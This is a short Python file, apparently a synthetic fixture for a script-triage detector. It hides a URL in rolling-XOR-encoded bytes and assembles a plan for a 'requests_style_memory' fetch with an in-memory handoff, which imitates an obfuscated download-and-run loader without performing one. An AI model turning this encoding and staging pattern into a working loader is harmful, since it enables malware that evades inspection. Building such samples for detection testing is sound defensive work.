#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_b7c7dff4 = "111,82,96,28,111,27,126,14,125,64,33,66,51,70,47,93,56,103,21,112,29,114,6,99,79,43,66,49,65,32,84,55,95,0,109,8,101,10,120,1,125,28,120,25,105,29,120,10,55,69,32,81,36,65,50,70,53,106,25,109,20,120,29,66,47,74,39,72,58,67,63,76,56,89,62,91,4,103,8,125,19,103,90,107,23,100,29,115,7,102,30,35,79,38,85,33,126,29,114,31,111,29,120,16,117,27,104,1,110,0,124,19,113,23,98,17,114,19,103,14,97,15,50,84,59,73,36,69,49,110,3,98,18,110,13,108,30,108,5,96,18,47,88,48,85,48,92,3,98,16,115,27,114,4,97,29,106,3,109,9,102,17,98,61,94,54,87,62,80,109,29,114,5,96,18,97,9,108,0,108,51,71,40,119,7,126,10,98,13,99,31,124,29,112,0,97,8,111,1,94,55,83,110,13,108,1,113,16,121,30,112,93,56,89,109,11,106,8,107,15,55,81,45,88,42,70,123,19,103,19,99,16,42,5,42,79,46,26,124,29,127,28,120,64,38,8,109,21,116,25,105,5,96,78,39,73,63,94,50,91,63,16,114,69,118,67,34,65,121,65,111,31,102,26,111,28,121,11,84,53,82,55,89,45,16,88,45,67,55,69,32,83,32,112,9,125,21,122,20,59,94,63,11,109,12,110,13,105,81,55"
    CODEC_b7c7dff4 = "decimal_csv|rolling_xor|19"

    def load_b7c7dff4():
        return bytes(int(item) for item in MATERIAL_b7c7dff4.split(","))

    def decode_b7c7dff4(v_a19c):
        v_b27e = bytearray()
        v_e598 = 25
        for value in v_a19c:
            v_b27e.append(value ^ v_e598)
            v_e598 = value
        return bytes(v_b27e)

    def recover_b7c7dff4():
        v_d41a = (3, 5, 8, 13)[1:3]
        v_f602 = decode_b7c7dff4
        v_b27e = v_f602(load_b7c7dff4())
        v_c304 = v_b27e.decode("ascii", "strict")
        return v_c304

    def inspect_b7c7dff4():
        stream = io.BytesIO(recover_b7c7dff4().encode("ascii"))
        return stream.read().decode("ascii")

    def surface_b7c7dff4():
        return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))

    def obfuscation_b7c7dff4():
        return "{left}{right}".format_map({"left": "format_", "right": "map"})

    def plan_b7c7dff4():
        fields = dict(item.split("=", 1) for item in inspect_b7c7dff4().split("|"))
        analysis_surface = surface_b7c7dff4()
        obfuscation_surface = obfuscation_b7c7dff4()
        operation_plan = ("requests_style_memory", fields["url"], "memory-handoff")
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_b7c7dff4())
